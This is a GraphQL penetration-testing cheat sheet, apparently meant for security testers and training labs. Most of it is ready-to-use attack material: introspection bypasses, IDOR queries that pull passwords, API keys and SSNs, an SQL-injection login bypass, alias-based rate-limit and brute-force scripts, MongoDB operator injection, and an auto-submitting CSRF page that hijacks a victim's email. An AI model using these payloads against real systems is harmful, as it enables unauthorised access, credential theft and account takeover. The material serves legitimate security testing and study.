# GraphQL API Vulnerabilities - Quick Start Guide

Rapid testing reference for GraphQL security vulnerabilities.

> For the complete payload reference, attack techniques, tools, and defense controls, see [graphql-cheat-sheet.md](graphql-cheat-sheet.md).

---

## 60-Second Vulnerability Check

```bash
# 1. Discover endpoint (15s)
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' https://target.com/api

# 2. Test introspection (15s)
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' https://target.com/api

# 3. If blocked, try bypass (15s)
curl -X GET 'https://target.com/api?query={__schema%0A{types{name}}}'

# 4. Test IDOR (15s)
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{getUser(id:1){id username password email}}"}' \
  https://target.com/api
```

---

## Endpoint Discovery

```bash
# Common paths to test
/graphql
/api
/api/graphql
/v1/graphql
/gql
/query
/graph

# Universal discovery query
{"query":"{__typename}"}
```

---

## Introspection Queries

**Full introspection:**
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        args {
          name
          type { name kind }
        }
        type { name kind }
      }
    }
  }
}
```

**Quick introspection:**
```graphql
{__schema{types{name fields{name args{name}}}}}
```

**Introspection bypasses:**
```graphql
# Newline injection
{__schema%0A{types{name}}}

# Space injection
{__schema%20{types{name}}}

# Tab injection
{__schema%09{types{name}}}
```

---

## One-Liner Payload Library

### Discovery & Reconnaissance

```graphql
# Confirm GraphQL
{__typename}

# List all types
{__schema{types{name}}}

# List queries
{__schema{queryType{fields{name args{name type{name}}}}}}

# List mutations
{__schema{mutationType{fields{name args{name type{name}}}}}}

# Get specific type
{__type(name:"User"){fields{name type{name}}}}
```

### Exploitation

```graphql
# IDOR - Get user by ID
query{getUser(id:1){id username email password role}}

# IDOR - Batch enumeration
query{u1:getUser(id:1){username password}u2:getUser(id:2){username password}u3:getUser(id:3){username password}}

# Hidden field access
query{getBlogPost(id:3){postPassword secretData adminNotes}}

# Authentication bypass
mutation{login(input:{username:"admin",password:"' OR 1=1--"}){token}}

# Rate limit bypass (template)
mutation{a1:login(input:{username:"user",password:"pass1"}){success}a2:login(input:{username:"user",password:"pass2"}){success}}

# Deletion
mutation{deleteUser(id:3){success}}

# CSRF-vulnerable email change
mutation{changeEmail(input:{email:"attacker@evil.com"}){email}}
```

---

## Common Vulnerability Patterns

**IDOR - User Enumeration:**
```graphql
query{
  u1:getUser(id:1){id username email password}
  u2:getUser(id:2){id username email password}
  u3:getUser(id:3){id username email password}
  u4:getUser(id:4){id username email password}
  u5:getUser(id:5){id username email password}
}
```

**Information Disclosure:**
```graphql
query{
  getUser(id:1){
    id
    username
    email
    password
    apiKey
    secretKey
    token
    ssn
    creditCard
  }
}
```

**Authentication Bypass:**
```graphql
mutation{
  login(input:{username:"admin",password:"admin"}){
    token
    success
    user{id username role permissions}
  }
}
```

**Rate Limit Bypass (Aliases):**
```graphql
mutation{
  a1:action{result}
  a2:action{result}
  a3:action{result}
  # ... repeat 100+ times
}
```

---

## Brute Force Generation Script

```javascript
// Paste in browser console
const passwords = ['123456','password','12345678','qwerty','dragon','baseball','letmein','monkey','abc123','football','shadow','master','sunshine','ashley','bailey','12345','iloveyou','123123','charlie','peter'];
let mutation = 'mutation{';
passwords.forEach((p, i) => {
  mutation += `b${i}:login(input:{username:"carlos",password:"${p}"}){success}`;
});
mutation += '}';
console.log(mutation);
```

---

## CSRF PoC Template

```html
<html><body>
<form action="https://TARGET.com/graphql/v1" method="POST">
<input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }" />
<input type="hidden" name="operationName" value="changeEmail" />
<input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;attacker@evil.com&quot;}}" />
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

---

## NoSQL Injection via GraphQL Variables

When backend is MongoDB, inject operators into variable arguments:

```bash
# $ne operator — bypass is_admin:false filter
curl -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"query($f:JSON){users(filter:$f){username flag}}","variables":{"f":{"is_admin":{"$ne":false}}}}'

# $exists — dump records where flag field exists
curl -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{users(filter:{\"flag\":{\"$exists\":true}}){username flag}}"}'
```

**Important**: enumerate ALL results — sensitive data may be on any record, not just the first.
See: `graphql-nosql-combined.md` for full playbook.

---

## Decision Tree

```
START
  |
  +-- Endpoint Known?
  |   +-- YES -> Test introspection
  |   +-- NO  -> Try common paths (/api, /graphql, /gql)
  |
  +-- Introspection Works?
  |   +-- YES -> Save schema, enumerate queries/mutations
  |   +-- NO  -> Try bypasses (whitespace, GET method)
  |
  +-- Schema Known?
  |   +-- YES -> Test for vulnerabilities
  |   +-- NO  -> Use Clairvoyance or field suggestions
  |
  +-- Vulnerability Type?
  |   +-- IDOR -> Test getUser(id:X)
  |   +-- Info Disclosure -> Request sensitive fields
  |   +-- Auth Bypass -> Try admin accounts, SQLi/NoSQLi
  |   +-- Rate Limiting -> Use aliases
  |   +-- CSRF -> Convert to URL-encoded, generate PoC
  |   +-- MongoDB backend? -> NoSQL operator injection (see graphql-nosql-combined.md)
  |
  +-- Exploit -> Document -> Report
```

---

## Automation Scripts

### Python IDOR Testing

```python
import requests
import json

url = "https://target.com/graphql"
for i in range(1, 11):
    query = {"query": f"query{{getUser(id:{i}){{username password}}}}"}
    r = requests.post(url, json=query)
    print(f"ID {i}: {r.json()}")
```

### Response Analysis

```bash
# Parse with jq
echo '{"data":{"user":{"password":"secret"}}}' | jq '.data.user.password'

# Find success in large response
grep -o '"success":true' response.json
```

---

## Priority-Based Testing

### High Priority (Test First)
1. Introspection enabled on production
2. IDOR via user/object IDs
3. Password/credential exposure
4. Authentication bypass
5. CSRF via URL-encoded mutations

### Medium Priority
1. Rate limiting bypass with aliases
2. Information disclosure (non-credentials)
3. Missing authorization checks
4. Excessive data exposure
5. Error message disclosure

### Low Priority (Time Permitting)
1. Query depth/complexity limits
2. Batch query abuse
3. Field suggestions enabled
4. GraphiQL in production
5. Verbose error messages

---

## Quick Reference Cards

### Endpoint Discovery
```
Common Paths:
- /graphql
- /api
- /api/graphql
- /v1/graphql

Test:
POST /api
{"query":"{__typename}"}

Success:
{"data":{"__typename":"query"}}
```

### Introspection
```
Standard:
{__schema{types{name}}}

Bypasses:
{__schema%0A{types{name}}}
{__schema%20{types{name}}}
{__schema%09{types{name}}}

Alternative:
GET /api?query={__schema{types{name}}}
POST with x-www-form-urlencoded
```

### IDOR Testing
```
Pattern:
query{getUser(id:TARGET){FIELDS}}

Common IDs:
- id: 1 (admin)
- id: 2 (first user)
- id: 3 (test user)
- id: 0 (sometimes admin)

Sensitive Fields:
username, password, email,
apiKey, token, ssn, role
```

### Rate Limit Bypass
```
Aliases:
mutation{
  a1:action{result}
  a2:action{result}
  a3:action{result}
}

Remember:
- All in ONE HTTP request
- Unique alias names
- Search response for success
```

### CSRF
```
Requirements:
1. Accepts x-www-form-urlencoded
2. No CSRF tokens
3. No SameSite cookies

Steps:
1. Change to URL-encoded
2. Generate CSRF PoC
3. Modify target data
4. Deliver to victim
```
